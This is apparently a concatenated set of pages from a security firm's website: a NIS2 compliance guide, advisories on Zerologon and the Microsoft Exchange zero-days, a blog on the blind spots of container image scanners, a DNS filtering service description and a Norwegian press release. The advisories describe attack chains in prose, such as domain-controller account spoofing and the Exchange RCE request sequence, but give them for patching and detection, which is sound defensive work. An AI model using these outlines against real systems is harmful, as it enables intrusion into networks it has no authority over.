quality assurance purposes. The DNS server will also check the IP addresses contained in the reply against our IP block lists for added protection.We currently provide two service levels.An Open level, intended for anyone who would like to increase their overall protection. This is available to anyone, both companies and end users without any additional cost.An Enterprise level, containing extra security features. The Enterprise level is available upon request.The Open level includes a best effort service, managed 24/7 by our own team of infrastructure specialists and hosted in cloud infrastructure around the world. The IP and Domain block lists in the Open level service consists of reputation sources categorized as TLP:WHITE [], which means they are freely available to anyone. TLP:WHITE consists of entries from our own malware research, the continuous analysis of billions of events in the Argus Managed Defence service, findings from our Incident Response Team and publicly available sources.The enterprise service level is delivered through a separate, dedicated infrastructure. These DNS servers combine the security level from the Open service with additional features. For our enterprise level customers we are able to customize which reputation sources they get access to based on our knowledge of the actual customer. During an attack on your company, mnemonic will be able to filter out malicious traffic on-the-fly based on feedback from the mnemonic Incident Response Team (mIRT), your own IRT team or relevant authorities. This includes traffic from block lists not freely available to the public (e.g. data and information related to Advanced Persistent Threats, threats pertinent to your company alone or other limited campaigns).

{"title": "Why and how to prepare for NIS2?", "ingress": "The new NIS2 Directive includes updated requirements and will have an impact on more organisations", "content": "In this blog post, we’ll go through how the NIS2 Directive differs from the original NIS Directive, and how its field of relevance has expanded to apply to at least 500% more organisations.In an effort to raise all of the EU member states’ cyber capabilities, NIS2 increases cross-border collaboration to improve information flow around newly discovered incidents, threats, and vulnerabilities, as well as other new initiatives that aim to increase the cybersecurity level of critical services.This post also outlines the key reasons why your organisation should prepare for NIS2 and provides guidance on how an organisation can achieve compliance.The European Union (EU) has started to take several regulatory measures against cyber threats. To name a few that you might have heard of, we have the General Data Protection Regulation (GDPR), the Cybersecurity Act, the Digital Operational Resilience Act (DORA), and the Cyber Resilience Act. All of these are pieces of EU legislation designed to increase cybersecurity within the Union.Another piece in this puzzle is the Network and Information Systems Directive (The NIS Directive). The goal of the original NIS Directive was to make the EU more resilient to cyber threats by strengthening the cybersecurity of critical services. However, due to some problems with the original NIS Directive, the EU launched the NIS2 Directive in December 2022 to address the previous problems and to further strengthen cybersecurity in the EU.The sectors that were within the scope of the first NIS Directive are still the same, therefore, an organisation that had to comply with the original directive also has to comply with the new NIS2 Directive. However, there are also many new sectors that have to comply with the NIS2 Directive, all of the affected sectors are listed in the table below.A new size-cap rule is introduced in the NIS2 Directive to make it easier for organisations to identify themselves as a critical service. There are some exceptions to the size-cap rule but to summarise & simplify the rule you can say that your organisation falls within the scope of the NIS2 Directive if your organisation classifies as one of the Essential Entities sectors, has over 250 employees and an annual turnover above 50 million EUR or an annual balance sheet over 43 million. Your organisation will also be included in the scope if it classifies as one of the Important Entities sectors, has over 50 employees and an annual turnover or an annual balance sheet above 10 million EUR., so even though your organisation was not affected by the first NIS Directive, there is a greater chance that NIS2 will have an impact on your organisation.The quick answer to this question is not yet. However, , when it is finalised. It is worth noting here that if the NIS2 Directive gets accepted into the European Economic Area (EEA) agreement, then critical services in Norway that are within the scope will eventually have to follow the obligations in the NIS2 Directive. Besides this, even if the EEA agreement would not accept the NIS2 Directive, Norwegian organisations might need to comply with third-party requirements if they are delivering services to an organisation that operates within the EU.In short,  The cybersecurity risk-management measures emphasise that organisations should take a systematic risk-based approach to minimise cyber incidents and list minimum security measures that all organisations must include in their organisation to protect their network and information systems. The security measures that all affected organisations should adopt are listed below.(a) policies on risk analysis and information system security;(b) incident handling;(c) business continuity, such as backup management and disaster recovery, and crisis management;(d) supply chain security, including security-related aspects concerning the relationships between each entity and its direct suppliers or service providers;(e) security in network and information systems acquisition, development and maintenance, including vulnerability handling and disclosure;(f) policies and procedures to assess the effectiveness of cybersecurity risk-management measures;(g) basic cyber hygiene practices and cybersecurity training;(h) policies and procedures regarding the use of cryptography and, where appropriate, encryption;(i) human resources security, access control policies and asset management;(j) the use of multi-factor authentication or continuous authentication solutions, secured voice, video and text communications and secured emergency communication systems within the entity, where appropriate.Besides the risk-based approach that should be applied, organisations that are within the scope of the NIS2 Directive also have to comply with reporting obligations. The reporting obligations exist because the EU wants to raise all of the member states cyber capabilities and to do this, cross-border collaboration is needed so that information can spread when new incidents, threats, and vulnerabilities are being discovered. Therefore, organisations that encounter a significant incident have to give an early warning to the nation's CSIRT (Computer Security Incident Response Team) or, in some cases, to the relevant competent authority.The warning should be made without undue delay within 24 hours from the point in time where the organisation became aware of the incident. Within 72 hours a report should be submitted that explains the initial assessment of the incident, such as its impact, severity and indicators of compromise. Within one month, a final report should be created that includes possible cross-border impact, a comprehensive description, ongoing and applied mitigation measures, and the root cause of the incident.So, what could be the consequences if your organisation is affected by the NIS2 Directive but does not follow its requirements and obligations. First of all, the supervisory capabilities have increased in the NIS2 Directive, which means that audits are more likely to occur. If an organisation is unable to meet the requirements and measures, the organisation can be targeted by an administrative fine.The fine depends on the situation and if your organisation is listed as an essential or important entity. At most it can be 10 000 000 EUR or 2% of the total annual turnover for essential entities and 7 000 000 EUR or 1,4% of the total annual turnover for important entities. In addition to the administrative fines, temporary suspension of top management is also a potential penalty if the organisation fails to comply with the NIS2 Directive.Each EU member state shall implement the NIS2 Directive into their own legislation no later than the 17th of October 2024, and when the national law is implemented, organisations should be ready to comply with the directive. The reason for this is because one day later, on the 18th of October 2024, organisations within the scope will be required to meet the obligations in the NIS2 Directive.First of all, make a thorough analysis of whether or not your organisation is within the scope of the NIS2 Directive. After this is done, you should follow the national discussion regarding the NIS2 Directive to get a better picture of how it will be implemented into your national law.If you have identified that your organisation is within the scope of the NIS2 Directive you should highly consider implementing an Information Security Management System (ISMS). An ISMS is a risk-based management system that allows organisations work systematically with information security. An ISMS contains policies, procedures, and controls that help an organisation to establish and maintain an appropriate and proportionate security level over time. In an ISMS everything should be aligned with the organisation and its business strategy.The ISMS will assist your organisation in the process of identifying assets, vulnerabilities and threats and then map them in relation to the accepted risk level. An ISMS implementation should always be risk-based and cost-effective and it can be based upon current information security standards such as ISO27001 and  or it can be tailored for your organisation and its needs. The ISMS will therefore help your organisation with effective NIS2 compliance as well as promoting surveillance and maintenance of your security level to strengthen your organisation’s digital assets.It is important to note here that a complete ISMS is not built over a day. The exact time is hard to generalise because it depends on the size of your organisation, your current measures and the scope of the ISMS. Based on our experience, it takes at least 6-9 months if you want your ISMS to be certified to a standard such as ISO27001, while a smaller risk-based ISMS usually takes between 3-6 months.As previously mentioned, an ISMS takes time to implement and NIS2 will be enforced in less than one year. Because of this, it is a great idea to start as soon as possible so that your organisation will be ready to adhere to the legal requirements. However, it is also important to remember the root cause to why an organisation should develop an ISMS and follow the NIS2 obligations, which is to protect itself from threats.An ISMS, together with the minimum security measures that are listed in the NIS2 Directive are not just boring compliance work. They are, in fact, great security measures that all organisations, regardless of compliance obligations or not, should consider implementing to avoid common attacks such as  and , while also allowing your organisation to increase its cybersecurity maturity level.

{"title": "Threat Advisory: Zerologon - Netlogon Elevation of Privilege Vulnerability (CVE-2020-1472)", "ingress": "On August 11, 2020, Microsoft patched a privilege escalation vulnerability in Microsoft Netlogon Remote Protocol (MS-NRPC). The vulnerability allows an attacker to impersonate the machine account of any domain joined computer, and set a known or empty password for the machine account.", "content": "On August 11, 2020, Microsoft patched a privilege escalation vulnerability in Microsoft Netlogon Remote Protocol (MS-NRPC). The vulnerability allows an attacker to impersonate the machine account of any domain joined computer, and set a known or empty password for the machine account.The vulnerability is particularly severe as it may be used to obtain full domain administrator privileges by spoofing the machine account of a Domain Controller. This enables the attacker to access the specific Domain Controller and extract all user password hashes, including hashes for domain administrators and kerberos service user (krbtgt), which can further be used to create golden tickets.  Effectively providing an attacker full domain administrator privileges.Multiple examples of proof-of-concept code are publicly available. Our Technical Risk Services department have successfully verified the exploit. This vulnerability should be mitigated AS-SOON-AS-POSSIBLE.In order to fully mitigate, you need to install the August 11 update and enable \"enforcement mode\" by modifying a registry key. Installing the patch alone does NOT fully mitigate the vulnerability.Microsoft is deploying mitigation in two phases. An initial deployment phase (2020-08-11) and an Enforcement Phase (2021-02-09). Microsoft is taking precautions in order to allow organisations time to rectify any non-compliant devices using MS-NRPC. First phase will provide new Event IDs to identify non-compliant devices and introduce a registry key to enable enforcement mode early. Second phase will enable enforcement mode regardless of registry setting.In the deployment phase (2020-08-11), Microsoft introduces a series of changes:All modern Windows operating systems are using secure RPC by default and are therefore not affected by these changes. In order to force a modern Windows operating systems to use insecure RPC one would have to deliberately disable default security policies in Windows operating systems. But non-Windows devices that are domain joined or trusted Active Directory domains forests might be using insecure RPC.In the Enforcement phase (2021-02-09), Microsoft will enforce secure RPC on all domain controllers, forcing all devices, Windows or non-Windows, to use secure RPC. The only exception are devices exempted using group policy settings as introduced by the August 11th 2020 update. In this phase, the Event ID 5829 will also be removed as all non-secure RPC connections become denied and logged as Event ID 5827.In their conclusion, Secura observed that the August patch broke their implementation of the exploit, possibly due to the ClientCredential field starting with too many zeroes. At the time of writing, it is unknown if the vulnerability still can be used, after the patch, either with brute-forcing, for man-in-the-middle or as a vector for Denial of Service (through disconnecting AD machine accounts). It should also be noted that according to Microsoft MVP Ryan Newington, the August patch does not disable non-secure RPC, it will still be available to use for devices but they are now logged under the new Event ID 5829 to allow identification.In an Active Directory environment with domain trust to other domains one would have to consider if the trusted party rely on using non-secure RPC. Identification of any devices in remote domains which use non-secure RPC is done in the same manner as domain local devices by analysing Event ID 5829. Allowing trusted domain to use non-secure RPC can be achieved by adding trust accounts to the exempted devices using group policy. Doing so is however strongly discouraged.Proof-of-concept code for the exploit is widely available. The exploit is currently being implemented in commonly used attack frameworks and tools. It has already been included in the popular tool \"mimikatz\". The wide availability and fairly high stability of the proof-of-concept code we have seen makes it certain that this exploit will be used by a wide range of threat actors ranging from Nation-state actors, crime-syndicates, criminals and opportunists.The only attacker drawback being that a password reset of a machine account in effect disconnects that machine from the domain (at least before an attacker can restore connection), making the exploit somewhat \"noisy\".If not mitigated, it will provide an attacker with an initial foothold means to perform privilege escalation from unauthenticated user to full domain administrator privileges.If partially mitigated with the just the patch there is a risk that someone will circumvent the obstacle preventing the current PoC code from working.Microsoft's recommendation is to install the patch and monitor for Event ID 5829, to see if you have non-Windows devices that uses insecure RPC, \"mitigate these\" and then enable enforcement mode.mnemonic's recommendation: Install the patch and enable enforcement mode AS-SOON-AS-POSSIBLE. If it is not possible to immediately enforce secure RPC, you should only allow a small window of time to identify non-compliant devices. These devices must by patched, upgraded or removed. If you cannot remove them for the time being, you should use the GPO to add explicit exceptions, and then turn on enforcement mode (note that we do not recommend to leave machine accounts with exceptions, as this is a potential backdoor for future privilege escalations, but it is better to have a few known systems, with insecure RPC enabled, than all systems).Network based signatures have already been deployed, and our threat researchers are working on improving these further. Initial signatures from some of our vendors had issues with large amounts of false positives. Network coverage is dependent on network sensors being deployed in a fashion that allows for inspection of traffic between computers/servers and the Domain Controllers.Our threat researchers are also working on log based detection for both scenarios with patched and vulnerable Domain Controllers. Thanks to the Windows Event IDs 5827, 5828 and 5829 we are confident we will be able to build content for patched Domain Controllers. We are still investigating if robust detection can be deployed for vulnerable servers. Detection through log analysis requires collection and analysis of Security Event Logs from domain controller as a part of the Argus service.For EDR based detection, it is unlikely that the EDR tools themselves will be able to inspect and analyse Microsoft Netlogon Remote Protocol. We are working with our vendors to get feedback on this issue. It is highly likely that EDR detection will be based on detecting the specific implementation of the exploit (detection of the tool being used) instead of detecting the actual RPC exploit.We are expecting vendors to deploy signatures to more tailored solutions (such as Azure ATP and SmartVision), and we are following up the vendors in our portfolio to get positive confirmation of working signatures.All Argus CVM customers with registered unpatched vulnerabilities have been notified explicitly. CVM requires authenticated scans to successfully register vulnerable servers. Our CVM team is currently investigating if a safe network based unauthenticated scan can be utilised.For further inquiries regarding Argus service, and coverage, please contact your Technical Account Manager (TAM) or create a ticket in the Argus portal. Do you want to be updated on mnemonic’s Threat Advisories?

This leads to an inappropriate use of the technology, which in turn leaves the user with a false sense of security.The goal of this article is to raise awareness about the actual capabilities of those scanners and help dev teams understand what they can and cannot do. Organisations developing containerised applications should review how they use static vulnerability scanners for container images in their pipeline, to ensure they are using that technology correctly.This blog post covers the following:Over the past few years, the use of software containers in enterprise environments has become extremely popular due to the industry shift from traditional silo deployments to micro-service architectures.Deployment pipelines are slowly incorporating more and more automated security tools to help them to shift left and catch vulnerabilities as early as possible during the development process. One of the most common tools found in those pipelines are what most people refer to as “container scanners.”A “container scanner” is a very broad term, which really does not say anything about the scanner’s approach for analysis or the type of issues it tries to detect. On one hand, a container scanner may be either static or dynamic, and can focus on analysing the running container itself, or its static image (sometimes both). On the other hand, a container scanner may search for a very specific type of issue or multiple ones at the same time, such as software vulnerabilities, malware or deviations from recommended security best practices.Nonetheless, when developers talk about “container scanning”, they most of the time refer to a static scanner analysing Linux-based container images for software vulnerabilities. We will see that such scanners tend to use a rather simple approach to discover vulnerabilities, which can give dev teams a false sense of security when misunderstood and/or used inappropriately in their pipelines.Note that this article does not mention any container-scanning product or vendor on purpose, as the goal of this blog post is to explain the general approach and pitfalls of most static scanners to find vulnerabilities in container images, rather than pointing fingers at specific vendors.Before jumping into the inner workings of static vulnerability scanners for container images, we first need to understand what container images actually are. Container images consist of the central piece of software containerisation, as they are the ones software containers are built upon.As illustrated below, the process for creating a software container starts with a simple text file called a  (on the left). The latter is often referred to as the container’s blueprint, as it holds the instructions describing what the end container will look like in terms of directories, as well as software packages it will contain. A Dockerfile is then built into an immutable  (in the middle), which represents the container’s shareable package that can be used to “ship code”. A  (on the right) only consists of an instantiation of a container image. Container images are therefore the central piece of the containerisation process, as they consist of the actual packages that can be shared with others.It is important to understand that container images are actually made out of , where each layer corresponds to an instruction defined in the image’s Dockerfile. Thanks to this layering system, container images are able to build upon each other, in order to avoid building everything from scratch every single time. As illustrated below, the high-level process for building a container image based on another one is as follows:The high-level approach used by most static scanners to find vulnerabilities in a container image consists of 2 main steps:The first step here is crucial, as the scanner’s ability to find vulnerabilities is only as good as its ability to discover all packages within an image in the first place.Packages are divided in two categories, depending on their nature. On one hand,  consist of the binaries used by the Linux distribution included in the image (e.g. busybox, glibc, openssl, etc.), and are usually installed via a package manager such as apk, yum or apt, depending on the distribution. On the other hand,  consist of dependency libraries required by a containerised application to function properly and are usually installed via an application-specific package manager. For example, common application packages for a Python application are \"datetime\", \"importlib\" or \"requests\", and are usually installed through \"pip\", the Package Installer for Python.Once a scanner has indexed all system and application packages in an image with their respective versions, the next step is to go through each package and verify whether a known vulnerability has been disclosed for it. An appropriate database is typically used for each type of package, depending on their nature. For example, the National Vulnerability Database (), the Red Hat Security Advisory database () or the  are typical sources used by static scanners to identify disclosed vulnerabilities in a system package. Similarly, appropriate data sources such as  for Python or the  are commonly used by open-source scanners to detect vulnerabilities in application packages.Note that not all static vulnerability scanners for container images support the detection of application packages. Furthermore, scanners that support that feature usually support a limited set of programming languages.Finally, note that open-source scanners tend to use multiple open-source vulnerability databases to detect known vulnerabilities (especially for application packages), whereas commercial products may sometimes use their own closed-source database which indexes multiple sources upstream.As explained above, the high-level approach used by most static scanners to find vulnerabilities in container images is rather simple and comes with a certain number of pitfalls, making the detection of specific vulnerabilities challenging. Vulnerabilities in system packages installed outside of a package manager are usually not detectedMany static scanners rely on the presence of a package manager in a container image to detect system packages in the first place. The approach usually consists of parsing the database file associated with the package manager present in the image, as it contains a list of all installed packages with their associated versions. The actual database file that is parsed during that process varies from one package manager to another, and is largely dependent on the underlying Linux distribution used as a base for the container image.Typically, most static vulnerability scanners parse one of the following files to detect system packages in a container image (non-exhaustive list):Thus, in case a system package is installed outside a package manager during the container-image building process (e.g. installed from source), that package will not be indexed in one of the above files and will not be detected as such by the static scanner. Since the package cannot be detected, the potential vulnerabilities it may contain will not be discovered either.Dev teams installing packages from source in container images should therefore be aware that most static vulnerability scanners will not be able to find vulnerabilities in such binaries.  Vulnerabilities in custom system packages are usually not detectedSometimes, dev teams might be extending an already-existing system package, in order to include custom functions (sometimes referred to as “self-compiled packages”), therefore updating the package’s version and sometimes even its name to a custom one.As explained previously, the core structure of most static vulnerability scanners for container images relies heavily on external vulnerability databases, which only contain information for official packages and versions. Thus, although a custom system package is detected correctly by a static scanner (e.g. by installing it via a package manager), the package will never be detected as vulnerable (although it may actually be), as no vulnerability database will contain a match for that particular package name and version combination.Note that this particular issue is more related to the way vulnerability detection works (i.e. relying solely on the use of vulnerability databases for official packages), rather than an issue specifically related to static vulnerability scanners for container images. Nonetheless, dev teams customising system packages during the container-image building process with a different name and/or version than what is official, should make sure they are not relying on static image scanners to find vulnerabilities in such binaries, as most of scanners will not be able to detect them. Vulnerabilities in application packages are not always detectedAs explained previously, application packages consist of dependency libraries required by a containerised application to function properly. The detection of vulnerabilities in application packages is very scanner-dependent, as not all scanners are able to detect such packages in the first place. For those that support that feature, the approach is similar to the one used to detect system packages, as it consists of parsing a specific file listing out the dependencies required by a main application. The actual dependency file that is parsed during that process varies depending on the language and framework of the main containerised application requiring the dependencies.Typically, most static vulnerability scanners supporting the detection of application packages parse one of the following files to detect such dependencies in a container image (non-exhaustive list):Most dev teams build container images with applications requiring dependencies. I cannot remember the number of pipelines I have seen with a static vulnerability scanner that either did not support the detection of application packages altogether, or did not support the programming language used by the developers.Dev teams should therefore review whether the scanner they are currently using is capable of detecting application packages for the type of application(s) they are developing, as vulnerabilities in such packages might go under the radar if that is not the case. Additionally, dev teams should make sure they understand how the static scanner detects the dependency file for their application, as some scanners are only able to detect such files in the working directory of an application, while others are able to detect it regardless of its location on the file system. Vulnerabilities in discovered packages are not always detectedAs discussed so far, the first challenge for a static vulnerability scanner is to detect all system and application packages within a container image, as a scanner’s ability to find vulnerabilities is only as good as its ability to discover all packages within a container image in the first place.Assuming that all packages are discovered and indexed properly, the second challenge for such scanners is to make sure all known vulnerabilities within each package are identified correctly, which implies using appropriate data sources for each type of package discovered within an image (i.e. system or application). Thus, a scanner’s ability to find vulnerabilities also depends largely on the type of vulnerability databases it uses, as well as the quality of its algorithm to parse from different sources.Sometimes, certain scanners tend to use obscure data sources with questionable completeness and maintenance. For example, many scanners use or have used the Alpine SecDB, which based on its description, consists of a vulnerability database for system packages in Alpine Linux with “backported fixes”. The last part of the official description is actually crucial, as it means that any package in  known to be vulnerable, but without a fix, or with a patch that has not been backported to older versions of the package, is not contained in the Alpine SecDB. I have seen multiple pipelines where dev teams were scanning custom Alpine-based images with a scanner using that database as its only source of CVEs for the distribution. In some cases, almost half of the vulnerabilities actually present in the system packages of their images were left undetected, compared to other scanners with more complete databases.The effective data sources used for detecting vulnerabilities in both system and application packages of different kinds (i.e. multiple Linux distributions and application languages) are therefore crucial to provide a good coverage of the vulnerabilities present in a container image. Note that open-source scanners tend to use multiple open-source databases to detect known vulnerabilities (especially for application packages), whereas commercial products typically use their own closed-source database which indexes multiple sources upstream.Dev teams relying on a static scanner to find vulnerabilities in container images should therefore ensure they understand the origin of the databases their scanner uses, as well as the eventual weaknesses that come along with these data sources (i.e. types of vulnerabilities that may be missing). A common issue with many data sources indexing disclosed vulnerabilities is that they only contain vulnerabilities with an existing patch, therefore missing all known but unpatched vulnerabilities (this is partly the case with the Alpine SecDB). Additionally, reviewing the maintainer(s) and update frequency might be a good indicator of the reliability of a vulnerability database.Note that conducting that kind of verification is usually easy with open-source scanners, as you can always have a look at their source code in case they do not document properly the vulnerability databases they use as data sources. Regarding closed-source scanners, some of them may disclose what kind of databases they use, while others might not. Trusting that the company behind a closed-source scanner is using trustworthy and complete vulnerability databases is however a part of the implied trust when using a remunerated service of this kind. Nonetheless, dev teams may always ask to get insight into internal documentation to prove the completeness of their vulnerability databases.The next step of the vulnerability-management process is to triage the vulnerabilities reported by a static scanner to prioritise security patching.For some reason, a lot of companies tend to build container images based on a full Linux distribution such as Debian, Ubuntu, Red Hat or Alpine Linux. Dev teams using that approach probably know that scanning images usually end up with hundreds, if not thousands of reported vulnerabilities, depending on the number of images to scan. Due to that massive number, a lot of companies tend to triage only vulnerabilities with an estimated high or critical impact, while ignoring the rest.Triaging is an expensive activity, as it ultimately requires a human to analyse and determine whether each reported vulnerability should be patched. Based on my experience, many companies tend to get around that challenge, by requiring all critical and high vulnerabilities to be patched as fast as possible, regardless of their actual exploitability in a containerised context.Nonetheless, patching vulnerabilities in container images is not always as straightforward as it may seem and can rapidly become a nightmare when many of them are inherited. As previously explained in the background section of this article, container images are made out of layers, where each layer corresponds to an instruction defined in the image’s original Dockerfile. Thanks to this layering system, container images are able to build upon each other, in order to avoid building everything from scratch all the time.However, patching an image with a vulnerability originating from a parent can be hard to manage if the parent image in question is not controlled by the dev team or the latter’s organisation. Even worse, there are situations where a custom-made image contains a vulnerability that needs to be patched, but originates from its grandparent image or even its great grandparent, requiring multiple images to be patched upstream, which may sometimes be managed by different companies. As illustrated below, a scenario of this kind requires the following in order for a company to ultimately patch a vulnerability inherited by a grandparent image:Note that every child image needs to wait for their parent to rebuild and inherit patched layers from their own parent before they can re-build themselves. In case a vulnerability is originating from a grandparent or higher, any child that fails to rebuild may prevent the rest of the chain to inherit the patch.As we can see, patching vulnerabilities in container images can rapidly become a nightmare when many parent images are involved and many vulnerabilities need to be patched. If the parent images are controlled by other entities, the complexity of vulnerability patching increases even more, as it introduces external dependencies upstream.Due to that complexity, I have seen companies that has given up completely on patching vulnerabilities in their container images, while others have tried to minimise the number of upstream dependencies by building all their images on a single Linux distribution with no other parent (typically Alpine Linux).The easiest way to manage vulnerabilities in software containers is to avoid having a large number of packages present in your images, hence removing the presence of potential vulnerabilities by going .As briefly mentioned in the previous section, most companies tend to build container images based on a full Linux distribution such as Debian, Ubuntu, Red Hat Linux or Alpine. Such images contain a large number of system packages that are most of the time completely unnecessary for running a containerised application, but provide threat actors a full set of tools to play with if they get access to the container once it is running. Personally, I am a strong advocate for distroless images as they almost remove the entire attack surface introduced by system packages, which are not even necessary in the first place.Distroless images are container images that only contain the developer’s application and its required dependencies, as well as the runtime environment necessary to run it (e.g. a Python interpreter for a Python application, a Java Virtual Machine for a Java application, etc.). Due to their extreme simplicity, distroless images therefore remove the necessity and pain of dealing with vulnerabilities in system packages, while allowing dev teams to shift left and focus on securing their source code instead.Since almost no system package is present in a distroless image apart from the application’s runtime environment, the need for vulnerability scanning is minimal and suddenly easy to handle. Application dependencies can still be scanned for vulnerabilities at this stage of the pipeline, or directly in source code before being built into a container image to shift left even more. No matter the approach, the use of distroless images provides companies a way to minimise the necessity for vulnerability management in container images, while avoiding a lot of headaches.My experience after assisting many organisations on this subject matter is that distroless images are still largely unknown, despite Google’s push to popularise them. In almost all cases, container images based on full Linux distributions (sometimes referred to as ) can be replaced with distroless alternatives, without even changing the dev team’s workflow once the changes are implemented. The only exception might be if the team already uses a deployment pipeline that is part of some kind of framework, which generates distrofull images without the possibility to modify that aspect easily. In that case, modifying the framework’s built-in pipeline is always a possibility, but usually requires an investment that not all companies are willing to make.Despite the growing popularity and excitement around the technology, software containers are still a misunderstood beast in many ways. Developers always seem surprised when someone mentions the existence of distroless images, or points out some of the pitfalls that come along with “container scanners”.Hopefully, this blog post will help raise awareness about those pitfalls, while providing a better understanding of the inner workings and actual capabilities of most static vulnerability scanners for container images.Based on previous experience, approaches combining the use of distroless images and a well-understood image scanner have proven to be efficient strategies for managing vulnerabilities in container images. I hope this contribution will help companies understand the importance of an appropriate use of static vulnerability scanners for container images, and avoid common pitfalls that too often provide a false sense of security in deployment pipelines.", "url": "https://www.mnemonic.io/resources/blog/managing-vulnerabilities-in-software-containers-how-to-avoid-common-pitfalls/", "category": "resources", "subcategory": "blog"},

{"title": "Threat Advisory: Multiple 0-day exploits targeting Microsoft Exchange | updated 15.03", "ingress": "Microsoft released an emergency update for Microsoft Exchange on the 2nd of March 2021 that addresses seven vulnerabilities", "content": "Microsoft released an emergency update for Microsoft Exchange on the 2nd of March 2021 that addresses seven vulnerabilities . Four of these enable remote code execution (RCE) and are currently being used in targeted attacks. Security researchers at Volexity were credited with reporting the vulnerabilities that were discovered being exploited in the wild since the 6th of January 2021.The following vulnerabilities are currently being exploited:Microsoft is tracking the threat actor currently using these vulnerabilities as \"HAFNIUM\", and believes the threat actor is a state-sponsored group operating out of China, based on observed victimology, tactics, and procedures. Microsoft also states that the threat actor mainly targets entities in the United States across multiple industry sectors. Including, but not limited to:The Danish security company Dubex has reported that they have responded to an incident in Denmark with a Danish customer that they claim is related to the HAFNIUM threat actor [, ]. This support Microsoft's statement that targets are also seen outside of the United States.The HAFNIUM threat group has been observed to use webshells including SIMPLESEESHARP, SPORTSBALL, ASPXSPY and China Chopper variants. A more detailed overview of all known techniques and tools is seen in the MITRE ATT&CK mapping below.Although no proof-of-concept code has been observed for any of the vulnerabilities yet, mnemonic Threat Intelligence believes that exploitation code will become publicly available within short time. We believe this will lead to a significant increase in threat actors scanning for and exploiting the vulnerabilities. One must expect that both state-sponsored and criminal threat actors will be amongst these, including threat actors that are known to deploy ransomware.(Updated 2021-03-08): Since the publication of these vulnerabilities we have seen wide-spread exploitation. The larger scale scans and webshell exploits started around 27th of February with more than 100.000 organizations as victims world-wide, according to media reports. According to ESET, at least one of the vulnerabilities is being targeted by multiple cyber-espionage groups (tracked by ESET as \"LuckyMouse,\" \"Tick,\" and \"Calypso\"). FireEye has identified several preliminary clusters of activity exploiting this vulnerability chain, and currently tracks this activity in three clusters: UNC2639, UNC2640, and UNC2643. US CISA issued an emergency directive warning about the active exploitation and ordering all US government departments and agencies to either patch their vulnerable exchange servers, or disconnect them from the Internet. NCSC NO released an  stating that any exposed Exchange server not updated within the end of the 3rd of March should be considered as likely compromised. US CISA further recommends investigating for signs of a compromise from at least September 1, 2020 through present.(Updated 2021-03-13): The first proof-of-concept exploit code was made publicly available on the 9th of March and since then we have observed a significant increase in opportunistic threat actors scanning for- and exploiting vulnerable servers world-wide. The exploitation has predominantly been in the form of semi-automatic installation of webshells that seems to leave backdoors for future access, or more manual by using tools to first gather credentials and system information followed by lateral movement and further compromise. The RCE requires chaining of two vulnerabilities; POST towards static resource (e.g. JavaScript / font-files) followed by POST traffic towards DDIService / SetOabVirtualDirectory. Palo Alto reported their observations of wide-spread installations of the  webshell, and Red Canary reported on  where the threat actors are dropping multiple webshells on victims at different times, with follow-up activity taking place days later. It has also been reports of threat actors installing and  as part of the vulnerabilities explotations.The DEVCORE team of security researchers that first reported CVE-2021-26855 (\"ProxyLogon\") to Microsoft on the 5th of January, have released an updated of the vulnerability disclosure. The timeline shows that they started their research into Microsoft Exchange server vulnerabilities in October 2020 and discovered the ProxyLogon vulnerability in December 2020. However, as , multiple sources have reported that the first Exchange server compromises were discovered as early as November 2020. This means that the vulnerabilities may have been discovered in parallel by HAFNIUM or other threat groups, or that the research details were leaked early on in the vulnerability research process.The following versions of Microsoft Exchange are considered vulnerable:Exchange Online is  affected according to Microsoft.mnemonic recommends the following:Scan Exchange server log files for indicators of compromise released by Microsoft  and Volexity . Microsoft has also published a PowerShell-script  that can be used to investigate relevant log files.Investigating this threat consists of confirming either of scenarios:The data to investigate for each scenario should be reflected by its scope and environment, but in particular for all scenarios: the IIS logs, Exchange HttpProxy logs, Exchange OABGenerator logs, Windows Application Event logs and checking for suspicious ASP/ASPX files in c:\\Inetpub\\wwwroot\\aspnet_client\\* and \\FrontEnd\\HttpProxy\\*mnemonic is carrying out threat hunting activities for our customers and we are alerting customers where we find indications of this threat and associated threat groups.

Hvis saken blir anmeldt, trenger politiet informasjon fra selskapet som er rammet og den aktøren som håndterer hendelsen sammen med selskapet.- Samarbeidsavtaler med store sikkerhetsselskaper gjør at vi kan utveksle informasjon innenfor avtalte rammer. Avtalen med mnemonic innebærer at vi møtes jevnlig. Det gjør at vi blir kjent, øker forståelsen for hverandres roller og behov, bygger gjensidig tillit og på sikt bidrar til et samarbeid begge parter vil dra nytte av, sier avdelingsdirektør Olav Skard ved NC3. Fra før har Kripos samarbeidsavtale med Nordic Financial CERT.Private sikkerhetsselskaper- og organisasjoner innhenter informasjon i stor skala, blant annet gjennom aktiv trusseletterretning og innsamling av data generert av kundeforhold og tjenesteyting til både næringslivet og offentlig sektor.- Deler av denne informasjonen kan gjøres tilgjengelig for Kripos ved behov. Dette er et godt eksempel på at politiet gjennom samvirke med private aktører kan fremskaffe informasjon vi ellers ikke ville hatt tilgang til. Vi bruker informasjon andre har skaffet i stedet for å bruke betydelige ressurser på å skaffe den selv, sier Skard.Tønnes Ingebrigtsen, administrerende direktør i mnemonic, mener samarbeidsavtalen har stort potensial.- Vi er glade for å kunne tilrettelegge for at Kripos får mer informasjon om det kriminelle landskapet, slik at de kan gjennomføre sitt viktige oppdrag på best mulig måte. Grunnlaget for at vi ønsker en slik avtale er gapet vi observerer mellom de sakene som blir rapportert til politiet og den faktiske situasjonen, sier han.- Etter å ha aktivt arbeidet med  over flere år, vet vi at slike saker underrapporteres i Norge. Ved å ha et etablert samarbeid og felles forståelse vil det bli enklere for våre kunder å gå riktig fram når de selv trenger å rapportere en hendelse til politiet, samt for oss å bistå eventuell etterforskning med kontekst og tilrettelegging, avslutter Ingebrigtsen.Kripos mener flere slike avtaler om samarbeid vil kunne gi verdifulle bidrag til kriminalitetsbekjempelse nasjonalt og internasjonalt.- Det er aktuelt å inngå slike avtaler med flere aktører i Norge og i utlandet. Slike avtaler må helt konkret legge til rette for en bedre oppdragsløsning i det daglige, og samtidig bidra til å forebygge, avdekke og bekjempe cyberkriminalitet i vid forstand, sier Skard.

